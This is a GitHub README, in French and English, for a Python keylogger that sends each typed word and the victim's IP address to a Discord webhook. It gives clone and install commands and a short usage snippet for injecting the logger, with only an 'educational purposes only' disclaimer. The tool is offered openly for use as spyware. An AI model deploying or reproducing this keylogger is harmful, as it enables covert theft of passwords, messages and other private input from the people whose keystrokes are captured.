<p align='center'>
  <b>Follow me here:</b><br>
  <a href="https://discord.gg/kjdsvNqJff">Discord</a> |
  <a href="https://www.youtube.com/channel/UCdIuioH8MzwMD88XGkliupA">YouTube</a> |
  <a href="https://github.com/KanekiX2">Github</a>
</p>

--- 

**FR:** A but educatif seulement.  
**EN:** For educational purposes only.  

![](https://home.sophos.com/en-us/medialibrary/Microsites/Home/SecurityCenter/what-is-a-keylogger.jpg)
# Keylogger  
**FR** : Kaneki Keylogger est un simple key logger écrit en python qui envoie les mots à chaque touche espace où entrer presser, Proposer à but éducatif.  
**EN** : Kaneki Keylogger is a simple keylogger written in python that sends the words to each key space to enter press, Suggest for educational purpose.  


## 💻 Features
- Send the words type to a discord webhook
- Send the words at each space to avoid a ratelimit

## 🛠 Insallation & Usage
### Installation
```bash
git clone https://github.com/KanekiX2/KeyLogger
cd KeyLogger
pip install -r requirements.txt
```
### Usage
```py
from Keylogger import Inject

Injector = Inject(hook="YOUR WEBHOOK LINK")
Injector.get_ip()
Injector.run()
Injector.listener_s()
```


## 📷 Demo
![](https://cdn.discordapp.com/attachments/809886609717329920/835762012650209300/unknown.png)

##  📝 Contact
Mail : _kaneki_pro@protonmail.com_ <br>
Discord : `Kaneki#8888`


## 📚 Contributions
All suggestions are welcome.

### 📜 License
Keylogger is under licensed MIT [MIT License](https://github.com/KanekiX2/KeyLogger/blob/master/LICENSE).

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
[![GPLv3 license](https://img.shields.io/badge/License-GPLv3-blue.svg)](http://perso.crans.org/besson/LICENSE.html)
[![Open Source Love svg1](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)
